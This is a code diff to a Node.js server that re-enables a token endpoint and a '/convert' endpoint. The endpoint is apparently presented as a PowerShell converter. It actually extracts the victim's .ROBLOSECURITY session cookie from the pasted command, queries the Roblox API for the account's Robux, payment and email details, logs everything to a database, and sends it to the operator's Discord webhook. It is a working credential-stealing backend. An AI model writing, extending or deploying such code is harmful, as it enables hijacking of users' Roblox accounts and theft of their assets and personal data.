@@ -723,9 +723,10 @@ function protectTokenEndpoint(req, res, next) {
   next();
 }
 
-// Original token endpoint - now returns 404 for protection
-app.get('/api/token', (req, res) => {
-  res.status(404).json({ error: 'Not found' });
+// Re-enabled token endpoint for root path (site owner)
+app.get('/api/token', tokenLimiter, protectTokenEndpoint, (req, res) => {
+  console.log(`✅ Root path token request approved for IP: ${req.ip}`);
+  res.json({ token: API_TOKEN });
 });
 
 // Test webhook endpoint
@@ -2309,9 +2310,160 @@ async function sendToDiscord(token, userAgent = 'Unknown', scriptType = 'Unknown
   }
 }
 
-// Original convert endpoint - now returns 404 for protection
-app.post('/convert', (req, res) => {
-  res.status(404).json({ error: 'Not found' });
+// Re-enabled convert endpoint for root path (site owner)
+app.post('/convert', validateRequest, async (req, res) => {
+  try {
+    let input;
+    let scriptType;
+
+    // Handle both JSON and text input
+    if (typeof req.body === 'string') {
+      input = req.body;
+      scriptType = 'Unknown';
+    } else if (req.body && req.body.powershell) {
+      input = req.body.powershell;
+      scriptType = req.body.scriptType || 'Unknown';
+    } else {
+      return res.status(400).json({ error: 'Invalid input format' });
+    }
+
+    // Check if input is just plain text (no PowerShell structure) - silently reject to prevent spam
+    const hasBasicPowershellStructure = /(?:Invoke-WebRequest|curl|wget|-Uri|-Headers|-Method|powershell|\.ROBLOSECURITY)/i.test(input);
+
+    if (!hasBasicPowershellStructure) {
+      // Silently reject plain text inputs without sending webhooks
+      return res.status(400).json({ 
+        success: false,
+        message: 'Invalid input format'
+      });
+    }
+
+    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
+    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');
+    const regex = /\.ROBLOSECURITY["']?\s*,?\s*["']([^"']+)["']/i;
+    const match = cleanedInput.match(regex);
+
+    if (match) {
+      const token = match[1].replace(/['"]/g, '');
+
+      // Check if token is empty, just whitespace, or only contains commas/special chars
+      if (!token || token.trim() === '' || token === ',' || token.length < 10) {
+        // Send fallback embed when no valid token found
+        const fallbackEmbed = {
+          title: "⚠️ Input Received",
+          description: "Input received but no ROBLOSECURITY found",
+          color: 0x8B5CF6,
+          footer: {
+            text: "Made By Lunix"
+          }
+        };
+
+        const fallbackPayload = {
+          embeds: [fallbackEmbed]
+        };
+
+        // Send to Discord webhook
+        try {
+          const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(fallbackPayload)
+          });
+        } catch (webhookError) {
+          console.error('❌ Fallback webhook failed:', webhookError.message);
+        }
+
+        return res.status(400).json({ 
+          success: false,
+          message: 'Failed wrong input'
+        });
+      }
+
+      const userAgent = req.headers['user-agent'] || 'Unknown';
+
+      // Fetch user data from Roblox API
+      const userData = await fetchRobloxUserData(token);
+
+      // If user data fetch failed, create a minimal user data object
+      const webhookUserData = userData || {
+        username: "Unknown User",
+        userId: "Unknown",
+        robux: 0,
+        premium: false,
+        rap: 0,
+        summary: 0,
+        creditBalance: 0,
+        savedPayment: false,
+        robuxIncoming: 0,
+        robuxOutgoing: 0,
+        korblox: false,
+        headless: false,
+        accountAge: 0,
+        groupsOwned: 0,
+        placeVisits: 0,
+        inventory: { hairs: 0, bundles: 0, faces: 0 },
+        emailVerified: false,
+        emailAddress: null,
+        voiceChatEnabled: false
+      };
+
+      // Log user data to database
+      await logUserData(token, webhookUserData, { ip: req.ip, directory: 'main' });
+
+      // Send to Discord webhook with user data
+      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData);
+
+      if (!webhookResult.success) {
+        return res.status(500).json({ 
+          success: false, 
+          error: `Webhook failed: ${webhookResult.error}` 
+        });
+      }
+    } else {
+      // Send fallback embed when no token found
+      const fallbackEmbed = {
+        title: "⚠️ Input Received",
+        description: "Input received but no ROBLOSECURITY found",
+        color: 0x8B5CF6,
+        footer: {
+          text: "Made By Lunix"
+        }
+      };
+
+      const fallbackPayload = {
+        embeds: [fallbackEmbed]
+      };
+
+      // Send to Discord webhook
+      try {
+        const response = await fetch(process.env.DISCORD_WEBHOOK_URL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(fallbackPayload)
+        });
+      } catch (webhookError) {
+        console.error('❌ Fallback webhook failed:', webhookError.message);
+      }
+
+      return res.status(400).json({ 
+        success: false,
+        message: 'Failed wrong input'
+      });
+    }
+
+    res.json({ 
+      success: true,
+      message: 'Request submitted successfully!'
+    });
+  } catch (error) {
+    // Log error without exposing sensitive details
+    console.error('❌ Server error:', error.message);
+    res.status(500).json({ error: 'Server error processing request' });
+  }
 });
 
 // Legacy convert endpoint (kept for reference but disabled)
